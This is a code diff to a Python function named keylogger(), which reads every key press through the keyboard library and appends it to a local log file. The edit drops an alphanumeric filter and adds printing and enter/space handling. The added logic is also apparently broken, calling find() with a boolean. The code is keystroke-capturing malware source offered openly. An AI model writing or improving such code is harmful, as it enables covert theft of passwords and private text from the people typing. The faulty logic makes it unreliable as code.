@@ -26,7 +26,7 @@ def outreach():
 
 
 def keylogger():
-    allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+    keyevents = []
 
     while True:
         file = open(f'{os.getcwd()}{osDetect()}logg3.txt', 'a')
@@ -35,9 +35,20 @@ def keylogger():
 
         if event.event_type == keyboard.KEY_DOWN:
             char = keyboard.read_key()
-            for i in allchars:
-                if char == i:
-                    file.write(char)
+            print('pressed', char)
+
+            enterkey = char.find(event.name == 'enter')
+            spacekey = char.find(event.name == 'space')
+
+            #alle event.names implementieren / filtern
+
+            if enterkey > 0:
+                file.write("\n")
+            elif spacekey > 0:
+                file.write(" ")
+
+
+            file.write(char)
 
             if event.name == 'space':
                 char = '\n'
